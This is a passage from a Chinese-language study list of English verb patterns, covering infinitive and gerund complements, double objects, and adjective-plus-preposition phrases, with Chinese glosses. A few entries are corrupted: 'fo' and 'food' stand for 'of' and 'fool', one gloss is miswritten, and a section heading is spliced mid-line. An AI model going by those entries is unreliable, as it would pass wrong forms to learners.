&lt;p>aim to do sth. 打算做某事&lt;/p>
&lt;p>fail to do sth. 未能做某事&lt;/p>
&lt;p>long to do sth. 渴望做某事&lt;/p>
&lt;p>happen to do sth. 碰巧做某事&lt;/p>
&lt;p>hesitate to do sth. 犹豫做某事&lt;/p>
&lt;p>struggle to do sth. 努力做某事&lt;/p>
&lt;h2 id="接不定式作宾补的36个常用动词">接不定式作宾补的36个常用动词&lt;/h2>
&lt;p>advise sb. to do sth. 建议某人做某事&lt;/p>
&lt;p>allow sb. to do sth. 允许某人做某事&lt;/p>
&lt;p>ask sb. to do sth.请（叫）某人做某事&lt;/p>
&lt;p>bear sb. to do sth.忍受某人做某事&lt;/p>
&lt;p>beg sb. to do sth. 请求某人做某事&lt;/p>
&lt;p>cause sb. to do sth. 导致某人做某事&lt;/p>
&lt;p>command sb. to do sth. 命令某人做某事&lt;/p>
&lt;p>drive sb. to do sth .驱使某人做某事&lt;/p>
&lt;p>elect sb. to do sth. 选举某人做某事&lt;/p>
&lt;p>encourage sb. to do sth. 鼓励某人做某事&lt;/p>
&lt;p>expect sb. to do sth. 期望某人做某事&lt;/p>
&lt;p>forbid sb. to do sth. 禁止某人做某事&lt;/p>
&lt;p>force sb. to do sth. 强迫某人做某事&lt;/p>
&lt;p>get sb. to do sth. 使（要）某人做某事&lt;/p>
&lt;p>hate sb. to do sth. 讨厌某人做某事&lt;/p>
&lt;p>help sb. to do sth. 帮助某人做某事&lt;/p>
&lt;p>intend sb. to do sth. 打算要某人做某事&lt;/p>
&lt;p>invite sb. to do sth. 邀请某人做某事&lt;/p>
&lt;p>leave sb. to do sth. 留下某人做某事&lt;/p>
&lt;p>like sb. to do sth. 喜欢某人做某事&lt;/p>
&lt;p>mean sb. to do sth. 打算要某人做某事&lt;/p>
&lt;p>need sb. to do sth. 需要某人做某事&lt;/p>
&lt;p>oblige sb. to do sth. 迫使某人做某事&lt;/p>
&lt;p>order sb. to do sth. 命令某人做某事&lt;/p>
&lt;p>permit sb. to do sth. 允许某人做某事&lt;/p>
&lt;p>persuade sb. to do sth. 说服某人做某事&lt;/p>
&lt;p>prefer sb. to do sth. 宁愿某人做某事&lt;/p>
&lt;p>request sb. to do sth. 要求某人做某事&lt;/p>
&lt;p>remind sb. to do sth. 提醒某人做某事&lt;/p>
&lt;p>teach sb. to do sth .教某人做某事&lt;/p>
&lt;p>tell sb. to do sth. 告诉某人做某事&lt;/p>
&lt;p>train sb. to do sth. 训练某人做某事&lt;/p>
&lt;p>trouble sb. to do sth. 麻烦某人做某事&lt;/p>
&lt;p>want sb. to do sth. 想要某人做某事&lt;/p>
&lt;p>warn sb. to do sth. 警告某人做某事&lt;/p>
&lt;p>wish sb. to do sth. 希望某人做某事&lt;/p>
&lt;p>注：不要受汉语意思的影响而误用以下动词句型：&lt;/p>
&lt;p>汉语说：“害怕某人做某事”，但英语不说fear sb. to do sth.。&lt;/p>
&lt;p>汉语说：“原谅某人做某事”，但英语不说excuse [forgive] sb. to do sth.。&lt;/p>
&lt;p>汉语说：“拒绝某人做某事”，但英语不说refuse sb. to do sth.。&lt;/p>
&lt;p>汉语说：“惩罚某人做某事”，但英语不说punish sb. to do sth.。&lt;/p>
&lt;p>汉语说：“建议某人做某事”，但英语不说suggest [propose] sb. to do sth.。&lt;/p>
&lt;p>汉语说：“赞成某人做某事”，但英语不说approve sb. to do sth.。&lt;/p>
&lt;p>汉语说：“通知某人做某事”，但英语不说inform sb. to do sth.。&lt;/p>
&lt;p>汉语说：“欢迎某人做某事”，但英语不说welcome sb. to do sth.。&lt;/p>
&lt;p>汉语说：“坚持某人做某事”，但英语不说insist [persist] sb. to do sth.。&lt;/p>
&lt;p>汉语说：“希望某人做某事”，但英语不说hope sb. to do sth.。&lt;/p>
&lt;p>汉语说：“安排某人做某事”，但英语不说arrange sb. to do sth.。&lt;/p>
&lt;p>汉语说：“要求某人做某事”，但英语不说demand sb. to do sth.。&lt;/p>
&lt;p>汉语说：“感谢某人做某事”，但英语不说thank sb. to do sth.。&lt;/p>
&lt;p>汉语说：“祝贺某人做某事”，但英语不说congratulate sb. to do sth.。&lt;/p>
&lt;p>汉语说：“阻止某人做某事”，但英语不说prevent sb. to do sth.。&lt;/p>
&lt;p>要表示以上意思，可换用其他表达：&lt;/p>
&lt;p>汉语的“原谅某人做某事”，英语可说成excuse [forgive] sb. for doing sth.。&lt;/p>
&lt;p>汉语的“希望某人做某事”，英语可说成wish sb. to do sth.。&lt;/p>
&lt;p>汉语的“建议某人做某事”，英语可说成advise sb. to do sth.。&lt;/p>
&lt;p>汉语的“安排某人做某事”，英语可说成arrange for sb. to do sth.。&lt;/p>
&lt;p>汉语的“要求某人做某事”，英语可说成demand of sb. to do sth.。&lt;/p>
&lt;p>汉语的“感谢某人做某事”，英语可说成thank sb. for doing sth.。&lt;/p>
&lt;p>汉语的“祝贺某人做某事”，英语可说成congratulate sb. on doing sth.。&lt;/p>
&lt;p>汉语的“阻止某人做某事”，英语可说成prevent sb. from doing sth.。&lt;/p>
&lt;h2 id="接动名词不接不定式作宾语的34个常用动词">接动名词（不接不定式）作宾语的34个常用动词&lt;/h2>
&lt;p>admit doing sth. 承认做某事 advise doing sth. 建议做某事&lt;/p>
&lt;p>allow doing sth. 允许做某事 appreciate doing sth. 感激做某事&lt;/p>
&lt;p>avoid doing sth. 避免做某事 consider doing sth. 考虑做某事&lt;/p>
&lt;p>delay doing sth. 推迟做某事 deny doing sth. 否认做某事&lt;/p>
&lt;p>discuss doing sth. 讨论做某事 dislike doing sth. 不喜欢做某事&lt;/p>
&lt;p>enjoy doing sth. 喜爱做某事 escape doing sth. 逃脱做某事&lt;/p>
&lt;p>excuse doing sth. 原谅做某事 fancy doing sth. 设想做某事&lt;/p>
&lt;p>finish doing sth. 完成做某事 forbid doing sth. 禁止做某事&lt;/p>
&lt;p>forgive doing sth. 原谅做某事 give up doing sth. 放弃做某事&lt;/p>
&lt;p>imagine doing sth. 想象做某事 keep doing sth. 保持做某事&lt;/p>
&lt;p>mention doing sth. 提及做某事 mind doing sth. 介意做某事&lt;/p>
&lt;p>miss doing sth. 错过做某事 pardon doing sth. 原谅做某事&lt;/p>
&lt;p>permit doing sth. 允许做某事 practice doing sth. 练习做某事&lt;/p>
&lt;p>prevent doing sth. 阻止做某事 prohibit doing sth. 禁止做某事&lt;/p>
&lt;p>put off doing sth. 推迟做某事 report doing sth. 报告做某事&lt;/p>
&lt;p>risk doing sth. 冒险做某事 stop doing sth. 停止做某事&lt;/p>
&lt;p>suggest doing sth. 建议做某事 understand doing sth. 理解做某事&lt;/p>
&lt;h2 id="接现在分词作宾补的20个常用动词">接现在分词作宾补的20个常用动词&lt;/h2>
&lt;p>bring sb. doing sth.引起某人做某事 catch sb. doing sth. 碰上（撞上）某人做某事&lt;/p>
&lt;p>discover sb. doing sth. 发现某人做某事 feel sb. doing sth. 感觉某人做某事&lt;/p>
&lt;p>find sb. doing sth. 碰上（撞上）某人做某事 get sb. doing sth. 使某人做某事&lt;/p>
&lt;p>have sb. doing sth. 使某人做某事 hear sb. doing sth. 听见某人做某事&lt;/p>
&lt;p>keep sb. doing sth. 使某人不停地做某事 listen to sb. doing sth. 听某人做某事&lt;/p>
&lt;p>look at sb. doing sth. 看着某人做某事 notice sb. doing sth. 注意到某人做某事&lt;/p>
&lt;p>observe sb. doing sth. 观察某人做某事 prevent sb. doing sth. 阻止某人做某事&lt;/p>
&lt;p>see sb. doing sth. 看见某人做某事 send sb. doing sth.使某人（突然）做某事&lt;/p>
&lt;p>set sb. doing sth. 使（引起）某人做某事 start sb. doing sth. 使某人开始做某事&lt;/p>
&lt;p>stop sb. doing sth. 阻止某人做某事 watch sb. doing sth. 观五、接动词原形作宾补的11个常用动词&lt;/p>
&lt;p>feel sb. do sth. 感觉某人做某事 have sb. do sth. 使某人做某事&lt;/p>
&lt;p>hear sb. do sth. 听见某人做某事 let sb. do sth.让某人做某事&lt;/p>
&lt;p>listen to sb. do sth. 听着某人做某事 look at sb. do sth. 看着某人做某事&lt;/p>
&lt;p>make sb. do sth. 使某人做某事 notice sb. do sth. 注意某人做某事&lt;/p>
&lt;p>observe sb. do sth. 观察某人做某事 see sb. do sth. 看见某人做某事&lt;/p>
&lt;p>watch sb. do sth. 观察某人做某事&lt;/p>
&lt;p>察某人做某事&lt;/p>
&lt;h2 id="接不定式或动名词作宾语意思相同的12个动词">接不定式或动名词作宾语意思相同的12个动词&lt;/h2>
&lt;p>like to do sth / like doing sth. 喜欢做某事&lt;/p>
&lt;p>love to do sth / love doing sth. 喜欢做某事&lt;/p>
&lt;p>hate to do sth / hate doing sth. 憎恨做某事&lt;/p>
&lt;p>prefer to do sth / prefer doing sth. 宁可做某事&lt;/p>
&lt;p>begin to do sth / begin doing sth. 开始做某事&lt;/p>
&lt;p>start to do sth / start doing sth. 开始做某事&lt;/p>
&lt;p>continue to do sth / continue doing sth. 继续做某事&lt;/p>
&lt;p>can’t bear to do sth / can’t bear doing sth. 不能忍受做某事&lt;/p>
&lt;p>bother to do sth / bother doing sth. 麻烦做某事&lt;/p>
&lt;p>intend to do sth / intend doing sth.想要做某事&lt;/p>
&lt;p>attempt to do sth / attempt doing sth. 试图做某事&lt;/p>
&lt;p>cease to do sth / cease doing sth. 停止做某事&lt;/p>
&lt;h2 id="接不定式或动名词作宾语意思不同的7个动词">接不定式或动名词作宾语意思不同的7个动词&lt;/h2>
&lt;p>(1) remember to do sth. 记住要做某事 remember doing sth. 记住曾做过某事&lt;/p>
&lt;p>(2) forget to do sth. 忘记要做某事 forget doing sth. 忘记曾做过某事&lt;/p>
&lt;p>(3) regret to do sth. 后悔（遗憾）要做某事 regret doing sth. 后悔（遗憾）曾做过某事&lt;/p>
&lt;p>(4) try to do sth. 设法要做某事 try doing sth. 做某事试试看有何效果&lt;/p>
&lt;p>(5) mean to do sth. 打算做某事 mean doing sth. 意味着做某事&lt;/p>
&lt;p>(6) can’t help to do sth. 不能帮助做某事 can’t help doing sth. 禁不住做某事&lt;/p>
&lt;p>(7) go on to do sth. 做完某事后接着做另一事 go on doing sth. 继续做一直在做的事&lt;/p>
&lt;p>注：stop to do sth. 与stop doing sth.也不同，前者指停下来去做某事，后者指停止正在做的事，但stop to do sth. 中的不定式不是宾语，是目的状语。&lt;/p>
&lt;h2 id="可接双宾语的38个常用动词">可接双宾语的38个常用动词&lt;/h2>
&lt;p>(1) 双宾语易位时需借助介词to的常用动词&lt;/p>
&lt;p>award sb. sth. = award sth. to sb. 颁奖给某人&lt;/p>
&lt;p>bring sb. sth. = bring sth. to sb. 把某物带给某人&lt;/p>
&lt;p>hand sb. sth. =hand sth. to sb. 把某物递给某人&lt;/p>
&lt;p>lend sb. sth. = lend sth. to sb. 把某物借给某人&lt;/p>
&lt;p>mail sb. sth. = mail sth. to sb. 把某物寄给某人&lt;/p>
&lt;p>offer sb. sth. = offer sth. to sb. 将某物给某人&lt;/p>
&lt;p>owe sb. sth. = owe sth. to sb. 欠某人某物&lt;/p>
&lt;p>pass sb. sth. = pass sth. to sb. 把某物递给某人&lt;/p>
&lt;p>pay sb. sth. = pay sth. to sb. 付给某人某物（钱）&lt;/p>
&lt;p>post sb. sth. = post sth. to sb. 把某物寄给某人&lt;/p>
&lt;p>read sb. sth. = read sth. to sb. 把某物读给某人听&lt;/p>
&lt;p>return sb. sth. = return sth. to sb. 把某物还给某人&lt;/p>
&lt;p>send sb. sth. = send sth. to sb. 把某物送给某人&lt;/p>
&lt;p>sell sb. sth. = sell sth. to sb. 把某物卖给某人&lt;/p>
&lt;p>serve sb. sth. = serve sth. to sb. 拿某物招待某人&lt;/p>
&lt;p>show sb. sth. = show sth. to sb. 拿某物给某人看&lt;/p>
&lt;p>take sb. sth. = take sth. to sb. 把某物拿给某人&lt;/p>
&lt;p>teach sb. sth. = teach sth. to sb. 教某人某物&lt;/p>
&lt;p>tell sb. sth. = tell sth. to sb. 告诉某人某情况&lt;/p>
&lt;p>throw sb. sth. = throw sth. to sb. 把某物扔给某人&lt;/p>
&lt;p>write sb. sth. = write sth. to sb. 给某人写信&lt;/p>
&lt;p>(2) 双宾语易位时需借助介词for的常用动词&lt;/p>
&lt;p>book sb. sth. = book sth. for sb. 为某人预定某物&lt;/p>
&lt;p>buy sb. sth. = buy sth. for sb. 为某人买某物&lt;/p>
&lt;p>choose sb. sth. = choose sth. for sb. 为某人选某物&lt;/p>
&lt;p>cook sb. sth. = cook sth. for sb. 为某人煮某物&lt;/p>
&lt;p>draw sb. sth. = draw sth. for sb. 为某人画某物&lt;/p>
&lt;p>fetch sb. sth. = fetch sth. for sb. 为某人去取某物&lt;/p>
&lt;p>find sb. sth. = find sth. for sb. 为某人找到某物&lt;/p>
&lt;p>fix sb. sth. = fix sth. for sb. 为某人准备某物&lt;/p>
&lt;p>get sb. sth. = get sth. for sb. 为某人拿来某物&lt;/p>
&lt;p>make sb. sth. = make sth. for sb. 为某人做某物&lt;/p>
&lt;p>order sb. sth. = order sth. for sb. 为某人订购某物&lt;/p>
&lt;p>pick sb. sth. = pick sth. for sb. 为某人采摘某物&lt;/p>
&lt;p>prepare sb. sth. = prepare sth. for sb. 为某人准备某物&lt;/p>
&lt;p>save sb. sth. = save sth. for sb. 为某人留某物&lt;/p>
&lt;p>sing sb. sth. = sing sth. for sb. 为某人唱某物（歌）&lt;/p>
&lt;p>spare sb. sth. = spare sth. for sb. 为某人让出某物&lt;/p>
&lt;p>steal sb. sth. = steal sth. for sb. 为某人偷某物&lt;/p>
&lt;p>注：有的动词后接的双宾语易位时，既可用介词to引出间接宾语，也可用介词for引出间接宾语，含义相同，如bring，play等：&lt;/p>
&lt;p>Bring me today’s paper. = Bring today’s paper to [for] me. 把今天的报纸拿给我。&lt;/p>
&lt;p>He played us the record he had just bought. = He played the record he had just bought for [to] us. 他放了他
刚买的唱片给我们听。&lt;/p>
&lt;p>有的动词后接的双宾语易位时，即可用介词to引出间接宾语，也可用介词for引出间接宾语，含义不同，如leave等：&lt;/p>
&lt;p>They left me no food. = They left no food for me. 他们没给我留一点食物。&lt;/p>
&lt;p>My uncle left me a large fortune. = My uncle left a large fortune to me.&lt;/p>
&lt;p>我叔叔死后留下一大笔财产给我。&lt;/p>
&lt;p>而有的动词后接双宾语时，既不能用介词to引出间接宾语，也不能用介词for引出间接宾语，如allow, ask, cause, charge, cost,
forgive, refuse等：&lt;/p>
&lt;p>He allows his son too much money. 他给他儿子的钱太多。&lt;/p>
&lt;p>He asked me some questions. 他问了我一些问题。&lt;/p>
&lt;p>This caused me much trouble. 着给我带来了许多麻烦。&lt;/p>
&lt;p>He charged me five dollars for a cup of tea. 他一杯茶向我要了5美元。&lt;/p>
&lt;p>His mistake cost him his job. 他的错误让他丢了工作。&lt;/p>
&lt;p>I envy you your good luck. 我羡慕你的好运。&lt;/p>
&lt;p>They forgave him his rudeness. 他们原谅了他的鲁莽。&lt;/p>
&lt;p>He refused her nothing. 她要什么就给什么。&lt;/p>
&lt;h2 id="可用于动词sbof-sth的8个常见动词">可用于“动词+sb+of sth”的8个常见动词&lt;/h2>
&lt;p>accuse sb. of sth. 控告某人犯某事（罪），指责某人做某事&lt;/p>
&lt;p>cheat sb. fo sth. 骗取某人某物&lt;/p>
&lt;p>cure sb. of sth. 治好某人的病，改掉某人的坏习惯&lt;/p>
&lt;p>inform sb. of sth. 通知某人某情况（事）&lt;/p>
&lt;p>remind sb. of sth. 使某人想起某情况（事）&lt;/p>
&lt;p>rid sb. of sth. 使某人摆脱某物&lt;/p>
&lt;p>rob sb. of sth. 抢劫某人的某东西&lt;/p>
&lt;p>warn sb. of sth. 警告某人有某情况&lt;/p>
&lt;h2 id="可用于动词sbfor-doing-sth的8个常见动词">可用于“动词+sb+for doing sth”的8个常见动词&lt;/h2>
&lt;p>blame sb. for doing sth. 指责某人做某事&lt;/p>
&lt;p>criticize sb. for doing sth. 批评某人做某事&lt;/p>
&lt;p>forgive sb. for doing sth. 原谅某人做某事&lt;/p>
&lt;p>excuse sb. for doing sth. 原谅某人做某事&lt;/p>
&lt;p>pardon sb. for doing sth. 原谅某人做某事&lt;/p>
&lt;p>punish sb. for doing sth. 惩罚某人做某事&lt;/p>
&lt;p>scold sb. for doing sth. 指责（责备）某人做某事&lt;/p>
&lt;p>thank sb. for doing sth. 感谢某人做某事&lt;/p>
&lt;h2 id="可用于动词sbinto-doing-sth的9个常见动词">可用于“动词+sb+into doing sth”的9个常见动词&lt;/h2>
&lt;p>cheat sb. into doing sth. 欺骗某人做某事 trick sb. into doing sth. 欺骗某人做某事&lt;/p>
&lt;p>food sb. into doing sth. 欺骗某人做某事 force sb. into doing sth. 迫使某人做某事&lt;/p>
&lt;p>argue sb. into doing sth. 说服某人做某事 talk sb. into doing sth. 说服某人做某事&lt;/p>
&lt;p>terrify sb. into doing sth. 威胁某人做某事 frighten sb. into doing sth. 吓唬某人做某事&lt;/p>
&lt;p>persuade sb. into doing sth. 说服某人做某事&lt;/p>
&lt;h2 id="容易误用作及物动词的9个不及物动词">容易误用作及物动词的9个不及物动词&lt;/h2>
&lt;p>误：deal a problem 正：deal with a problem 处理问题&lt;/p>
&lt;p>误：depend sb. 正：depend on sb. 依靠（依赖）某人&lt;/p>
&lt;p>误：insist doing sth. 正：insist on doing sth. 坚持要做某事&lt;/p>
&lt;p>误：knock the door 正：knock on [at] the door 敲门&lt;/p>
&lt;p>误：operate sb. 正：operate on sb. 为某人做手术&lt;/p>
&lt;p>误：participate sth. 正：participate in sth. 参加某事&lt;/p>
&lt;p>误：refer sth. 正：refer to sth. 查阅（参考)某物&lt;/p>
&lt;p>误：rely sb. / sth. 正：rely on sb. / sth. 依靠（依赖）某人（某物&lt;/p>
&lt;p>误：reply a letter 正：reply to a letter 回信&lt;/p>
&lt;p>注：在某些其他用法中，以上有的动词也可能及物，如insist, reply等动词后可接宾语从句，operate表示“操作”、“管理”等时则及物。&lt;/p>
&lt;h2 id="容易误用作不及物动词的8个及物动词">容易误用作不及物动词的8个及物动词&lt;/h2>
&lt;p>误：serve for sb. 正：serve sb. 为某人服务&lt;/p>
&lt;p>误：marry with sb. 正：marry sb. 与某人结婚&lt;/p>
&lt;p>误：discuss about sth. 正：discuss sth. 讨论某事&lt;/p>
&lt;p>误：mention about sth. 正：mention sth. 提到某事&lt;/p>
&lt;p>误：enter into a room 正：enter a room 进入房间&lt;/p>
&lt;p>误：contact with sb. 正：contact sb. 与某人联系&lt;/p>
&lt;p>误：equal to sth. 正： equal sth. 等于某物&lt;/p>
&lt;p>误：ring to sb. 正：ring sb. 给某人打电话&lt;/p>
&lt;p>注：有个别词在用于其他意义时，可以是不及物的，如enter into可以表示开始进入或从事某一状态或活动，或用于较抽象的概念。如：&lt;/p>
&lt;p>The country entered into a state of war. 这个国家进入战争状态。&lt;/p>
&lt;p>I can enter into your feelings at the loss of your father. 我理解你失去父亲后的心情。&lt;/p>
&lt;p>The two old men entered into a long conversation. 两位老人开始长谈起来。&lt;/p>
&lt;h2 id="17个常用be形容词about结构">17个常用“be+形容词+about”结构&lt;/h2>
&lt;p>be angry about 为……生气 be anxious about 为……担忧&lt;/p>
&lt;p>be careful about 当心…… be certain about 确信……&lt;/p>
&lt;p>be curious about 对……好奇 be disappointed about 对……失望&lt;/p>
&lt;p>be excited about 对……感到兴奋 be glad about 对……感到高兴&lt;/p>
&lt;p>be happy about 为……感到高兴 be hopeful about 对……抱有希望&lt;/p>
&lt;p>be mad about 对……入迷 be nervous about 为……感到不安&lt;/p>
&lt;p>be particular about 对……讲究 be sad about 为……而难过&lt;/p>
&lt;p>be serious about 对……认真 be sure about 对……有把握&lt;/p>
&lt;p>be worried about 为……担忧&lt;/p>
&lt;h2 id="10个常用be形容词at结构">10个常用“be+形容词+at”结构&lt;/h2>
&lt;p>be angry at 为……生气 be bad at 不善于……&lt;/p>
&lt;p>be clever at 擅长于…… be disappointed at 对……失望&lt;/p>
&lt;p>be expert at 在……方面是内行 be good at 善于……&lt;/p>
&lt;p>be mad at 对……发怒 be quick at 在……方面敏捷&lt;/p>
&lt;p>be skilful at 在……方面熟练 be slow at 在……方面迟钝&lt;/p>
&lt;h2 id="18个常用be形容词for结构">18个常用“be+形容词+for”结构&lt;/h2>
&lt;p>be anxious for 渴望 be bad for 对……有害，对……不利&lt;/p>
&lt;p>be bound for 前往 be celebrated for 以……出名&lt;/p>
&lt;p>be convenient for 对……方便，在……附近 be eager for渴望&lt;/p>
&lt;p>be famous for 因……闻名 be fit for 合适，适合&lt;/p>
&lt;p>be good for 对……有益（方便） be grateful for 感谢&lt;/p>
&lt;p>be hungry for 渴望得到 be late for 迟到&lt;/p>
&lt;p>be necessary for 对……有必要 be ready for 为……准备好&lt;/p>
&lt;p>be sorry for 因……抱歉 be suitable for 对……合适（适宜）&lt;/p>
&lt;p>be thankful for 因……而感激 be well-known for以……出名&lt;/p>
&lt;h2 id="6个常用be形容词from结构">6个常用“be+形容词+from”结构&lt;/h2>
&lt;p>be absent from 缺席，不在 be different from 与……不同&lt;/p>
&lt;p>be far from 离……远，远远不 be free from 没有，免受&lt;/p>
&lt;p>be safe from 没有……的危险 be tired from 因……而疲劳&lt;/p>
&lt;h2 id="13个常用be形容词in结构">13个常用“be+形容词+in”结构&lt;/h2>
&lt;p>be concerned in 与……有关 be disappointed in 对（某人）感到失望&lt;/p>
&lt;p>be engaged in 从事于，忙于 be experienced in 在……方面有经验&lt;/p>
&lt;p>be expert in 在……方面是行家 be fortunate in 在……方面幸运&lt;/p>
&lt;p>be honest in 在……方面诚实 be interested in 对……感兴趣&lt;/p>
&lt;p>be lack in 缺乏 be rich in 富于，在……方面富有&lt;/p>
&lt;p>be skilful in 擅长于 be successful in 在……方面成功&lt;/p>
&lt;p>be weak in 在……方面不行&lt;/p>
&lt;h2 id="18个常用be形容词of结构">18个常用“be+形容词+of”结构&lt;/h2>
&lt;p>be afraid of 害怕 be ashamed of 为……感到羞愧&lt;/p>
&lt;p>be aware of 意识到，知道 be capable of 能够，可以&lt;/p>
&lt;p>be careful of 小心，留心 be certain of 确信，对……有把握&lt;/p>
&lt;p>be fond of 喜欢 be free of 没有，摆脱&lt;/p>
&lt;p>be full of 充满 be glad of 为……而高兴&lt;/p>
&lt;p>be nervous of 害怕 be proud of 为……自豪&lt;/p>
&lt;p>be short of 缺乏 be shy of 不好意思&lt;/p>
&lt;p>be sick of 对……厌倦 be sure of 肯定，有把握&lt;/p>
&lt;p>be tired of 对……厌烦 be worthy of 只得，配得上&lt;/p>
&lt;h2 id="20个常用be形容词to结构">20个常用“be+形容词+to”结构&lt;/h2>
&lt;p>be accustomed to 习惯于 be blind to 对……视而不见&lt;/p>
&lt;p>be close to 靠近，接近 be cruel to 对……残酷，对……无情&lt;/p>
&lt;p>be devoted to 献身，专心于 be equal to 等于，能胜任&lt;/p>
&lt;p>be familiar to 为（某人）所熟悉 be harmful to 对……有危害&lt;/p>
&lt;p>be important to 对……重要p; be open to 对……开放，易受到&lt;/p>
&lt;p>be opposed to 反对，不赞成 be opposite to 在……对面，和……相反&lt;/p>
&lt;p>be polite to 对……有礼貌 be related to 与……有关（是亲戚）&lt;/p>
&lt;p>be respectful to 尊敬 be rude to 对……无礼&lt;/p>
&lt;p>be similar to 与……相似 be true to 忠实于，信守&lt;/p>
&lt;p>be used to 习惯于 be useful to 对……有用&lt;/p>
&lt;h2 id="16个常用be形容词with结构">16个常用“be+形容词+with”结构&lt;/h2>
&lt;p>be angry with 对（某人）生气 be bored with 对……厌烦&lt;/p>
&lt;p>be busy with 忙于 be careful with 小心&lt;/p>
&lt;p>be concerned with 关于，与……有关 be content with 以……为满足&lt;/p>
&lt;p>be delighted with 对……感到高兴 be disappointed with 对（某人）失望&lt;/p>
&lt;p>be familiar with 熟悉，精通 be honest with 对（某人）真诚&lt;/p>
&lt;p>be ill with 患……病 be patient with 对（某人）有耐心&lt;/p>
&lt;p>be pleased with 对……满意（高兴） be popular with 受……欢迎&lt;/p>
&lt;p>be satisfied with 对……满意 be strict with 对（某人）严格&lt;/p>
&lt;h2 id="24个常用in其他词of结构">24个常用“in+其他词+of”结构&lt;/h2>
&lt;p>in advance of 在……前面 in aid of 帮助&lt;/p>
&lt;p>in behalf of 为了，为了……的利益 in case of 如果，万一，以防&lt;/p>
&lt;p>in celebration of 庆祝 in charge of 负责，管理&lt;/p>
&lt;p>in commemoration of 纪念，庆祝 in defence of 保卫&lt;/p>
&lt;p>in explanation of 解释 in face of 面对&lt;/p>
&lt;p>in favour of 赞成，主张 in front of 在……前面&lt;/p>
&lt;p>in honor of 纪念，祝贺，欢迎 in memory of 纪念&lt;/p>
&lt;p>in need of 需要 in place of 代替&lt;/p>
&lt;p>in possession of 拥有 in praise of 称赞&lt;/p>
&lt;p>in respect of 关于，就……而言 in search of 寻找，搜找&lt;/p>
&lt;p>in sight of 看得见，在看见……的地方 in spite of 虽然，尽管&lt;/p>
&lt;p>in support of 为了支持（拥护）…… in view of 鉴于，考虑到&lt;/p>
&lt;p>注：同时注意一下相似结构：&lt;/p>
&lt;p>in exchange for 作为对……的交换 in preparation for 为……作准备&lt;/p>
&lt;p>in return for 作为……的报答 in reward for 作为……的报酬&lt;/p>
&lt;p>in addition to 加之，除……之外 in answer to 回答，响应&lt;/p>
&lt;p>in contrast to [with] 与……形成对比 in opposition to 与……相反，反对&lt;/p>
&lt;p>in reply to 作为对……的回答（答复） in response to 回答，响应&lt;/p>
&lt;p>in [with] reference to 关于 in [with] regard to 关于&lt;/p>
&lt;h2 id="27个带to-doing-sth的常用结构">27个带to doing sth.的常用结构&lt;/h2>
&lt;p>1．动词+介词to+动名词&lt;/p>
&lt;p>(1) admit to doing sth. 承认做了某事&lt;/p>
&lt;p>(2) apply to doing sth. 适用于做某事&lt;/p>
&lt;p>(3) object to doing sth. 反对做某事&lt;/p>
&lt;p>(4) see to doing sth. 负责做某事&lt;/p>
&lt;p>(5) stick to doing sth. 坚持做某事&lt;/p>
&lt;p>(6) take to doing sth. 喜欢上做某事，逐渐习惯做某事&lt;/p>
&lt;p>2．动词+宾语+介词to+动名词&lt;/p>
&lt;p>(1) apply oneself to doing sth. 专心致力于做某事&lt;/p>
&lt;p>(2) devote sth. to doing sth. 把……献给做某事&lt;/p>
&lt;p>(3) devote oneself to doing sth. 献身于做某事&lt;/p>
&lt;p>(4) limit sth. to doing sth. 把……限制在做某事的范围内&lt;/p>
&lt;p>(5) reduce sb. to doing sth. 使某人沦为做某事&lt;/p>
&lt;p>3．动词+名词+介词to+动名词&lt;/p>
&lt;p>(1) give one’s life to doing sth. 献身于做某事&lt;/p>
&lt;p>(2) give one’s mind to doing sth. 专心做某事&lt;/p>
&lt;p>(3) have a dislike to doing sth. 厌恶做某事&lt;/p>
&lt;p>(4) have an eye to doing sth. 注意做某事&lt;/p>
&lt;p>(5) have an objection to doing sth. 反对（反感）做某事&lt;/p>
&lt;p>(6) pay attention to doing sth. 注意做某事&lt;/p>
&lt;p>(7) set one’s mind to doing sth. 决心做某事&lt;/p>
&lt;p>4．be+形容词+介词to+动名词&lt;/p>
&lt;p>(1) be equal to doing sth. 等于做某事，能胜任做某事&lt;/p>
&lt;p>(2) be used to doing sth. 习惯于做某事&lt;/p>
&lt;p>(3) be opposed to doing sth. 反对做某事&lt;/p>
&lt;p>(4) be reduced to doing sth. 使某人沦为做某事&lt;/p>
&lt;p>(5) be devoted to doing sth. 把时间（钱，精力等）献给做某事&lt;/p>
&lt;p>(6) be limited to doing sth. 把……限制在做某事的范围内&lt;/p>
&lt;p>5．其他结构+介词to+动名词&lt;/p>
&lt;p>(1) get down to doing sth. 开始做某事，认真处理某事&lt;/p>
&lt;p>(2) look forward to doing sth. 盼望做某事&lt;/p>
&lt;p>(3) What do you say to doing sth? 你认为做某事如何？&lt;/p></description></item></channel></rss>